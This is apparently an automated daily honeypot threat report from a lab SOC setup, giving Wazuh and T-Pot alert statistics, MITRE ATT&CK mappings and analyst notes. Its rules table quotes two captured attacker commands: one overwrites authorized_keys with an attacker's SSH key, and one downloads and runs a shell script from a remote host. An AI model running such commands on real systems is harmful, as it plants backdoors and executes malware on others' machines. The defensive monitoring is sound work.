# LearningLab01 Daily Threat Intelligence Report — 2026-09-21

Generated: 2026-09-21T13:15:05.061Z

Report window: 2026-09-20T13:15:05.033Z through 2026-09-21T13:15:05.033Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 207,797 |
| Attack-related alerts | 53,781 |
| Honeypot interactions | 153,544 |
| Authentication failures | 24,990 |
| Authentication successes | 577 |
| Critical alerts | 195 |
| High alerts | 696 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 195 critical-severity alerts require priority review.
- 696 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 43.31:1.
- Country attribution currently covers only 1.58% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110209: T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk (103,626 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 195 | 0.09% |
| High | 696 | 0.33% |
| Medium | 2,124 | 1.02% |
| Low | 204,782 | 98.55% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 24,990
- Authentication successes: 577
- Failure-to-success ratio: 43.31:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 26,065 | 48.47% |
| Payload delivery | 26,065 | 48.47% |
| Authentication failure | 24,990 | 46.47% |
| Command execution | 1,862 | 3.46% |
| Malware | 158 | 0.29% |
| Reconnaissance | 142 | 0.26% |
| Web attack | 42 | 0.08% |
| SMTP attack | 14 | 0.03% |
| Network scan | 3 | 0.01% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 3,289 alerts, representing 1.58% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 204,508 | 98.42% | Not geolocated |
| New Zealand | 3,001 | 1.44% | ████████████████████ |
| United Kingdom | 160 | 0.08% | █ |
| United States | 65 | 0.03% | █ |
| Russia | 30 | 0.01% | █ |
| Denmark | 6 | 0.00% | █ |
| Romania | 5 | 0.00% | █ |
| France | 4 | 0.00% | █ |
| China | 3 | 0.00% | █ |
| Malta | 3 | 0.00% | █ |
| Slovakia | 3 | 0.00% | █ |
| Sweden | 3 | 0.00% | █ |
| Ukraine | 3 | 0.00% | █ |
| Canada | 2 | 0.00% | █ |
| Panama | 1 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Initial Access | 303 |
| Defense Evasion | 292 |
| Persistence | 291 |
| Privilege Escalation | 291 |
| Credential Access | 220 |
| Lateral Movement | 97 |
| Execution | 42 |
| Command and Control | 17 |
| Impact | 11 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 291 |
| Brute Force | 220 |
| Remote Services | 97 |
| Command and Scripting Interpreter | 42 |
| Ingress Tool Transfer | 17 |
| Exploit Public-Facing Application | 12 |
| Stored Data Manipulation | 11 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110209 | 5 | 103,626 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (103,626) |
| 110101 | 3 | 26,023 | Cowrie SSH connection from [IP address]. | tpot (26,023) |
| 110205 | 6 | 26,021 | T-Pot Honeytrap received a payload from [IP address] | tpot (26,021) |
| 110102 | 5 | 24,990 | Cowrie failed login from [IP address] using username root. | tpot (24,990) |
| 110204 | 4 | 9,680 | T-Pot Honeytrap connection from [IP address] to port 5909 | tpot (9,680) |
| 110207 | 5 | 8,746 | T-Pot SentryPeer SIP activity from [IP address]:52410, method INVITE | tpot (8,746) |
| 110219 | 4 | 3,139 | T-Pot CiscoASA web activity from [IP address]: "GET / HTTP/1.1" 200 - | tpot (3,139) |
| 110104 | 7 | 1,644 | Cowrie captured a command from [IP address]: system | tpot (1,644) |
| 110213 | 4 | 1,523 | T-Pot RDP connection from [IP address] to port 3389. | tpot (1,523) |
| 110201 | 4 | 386 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (386) |
| 110103 | 10 | 286 | Cowrie accepted login from [IP address] using username root. | tpot (286) |
| 110106 | 10 | 220 | Cowrie detected repeated failed logins from [IP address]. | tpot (220) |
| 5501 | 3 | 194 | PAM: Login session opened. | tpot (192), wazuh (2) |
| 533 | 7 | 192 | Listened ports status (netstat) changed (new port opened or closed). | tpot (192) |
| 110109 | 13 | 183 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (183) |
| 5502 | 3 | 165 | PAM: Login session closed. | tpot (163), wazuh (2) |
| 110105 | 12 | 111 | Cowrie captured a file download from [IP address]. | tpot (111) |
| 110221 | 7 | 108 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /SETTINGS.CFG HTTP/1.1" 404 - | tpot (108) |
| 110216 | 4 | 101 | T-Pot Mailoney received SMTP command from [IP address]:   | tpot (101) |
| 5715 | 3 | 97 | sshd: authentication success. | tpot (96), wazuh (1) |
| 110220 | 8 | 51 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (51) |
| 110212 | 10 | 44 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (44) |
| 110223 | 5 | 41 | T-Pot HoneyAML received  request from  to  on port . | tpot (41) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 110108 | 12 | 30 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (30) |
| 110215 | 4 | 29 | T-Pot MiniPrint event: connection, action open_conn, Connection opened | tpot (29) |
| 203 | 9 | 22 | Agent event queue is full. Events may be lost. | tpot (22) |
| 110208 | 7 | 17 | T-Pot SentryPeer detected SIP scanner Friendly-Scanner/1.1 from [IP address]:16199 | tpot (17) |
| 202 | 7 | 15 | Agent event queue is 90% full. | tpot (15) |
| 205 | 3 | 15 | Agent event queue is back to normal load. | tpot (15) |
| 110217 | 7 | 14 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: MAIL FROM:<hello@info.com>  | tpot (14) |
| 110225 | 13 | 12 | T-Pot HoneyAML detected a probable remote-code-execution and payload-delivery attempt from [IP address]. | tpot (12) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 110107 | 12 | 5 | Cowrie captured a probable payload-retrieval command from [IP address]: cd /tmp 2>/dev/null \|\| cd /var 2>/dev/null \|\| cd /dev/shm 2>/dev/null \|\| cd /run 2>/dev/null \|\| cd /root 2>/dev/null \|\| cd /;rm -f kla.sh;wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|busybox wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|curl -sLo kla.sh http://[IP address]/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet& | tpot (5) |
| 110211 | 9 | 3 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (3) |
| 110218 | 9 | 2 | T-Pot Mailoney detected repeated SMTP activity from one source. | tpot (2) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 86003 | 3 | 2 | Docker: Error message | tpot (2) |
| 110224 | 7 | 1 | T-Pot HoneyAML received an HTTP POST from [IP address] to /mcp. | tpot (1) |
| 19010 | 3 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
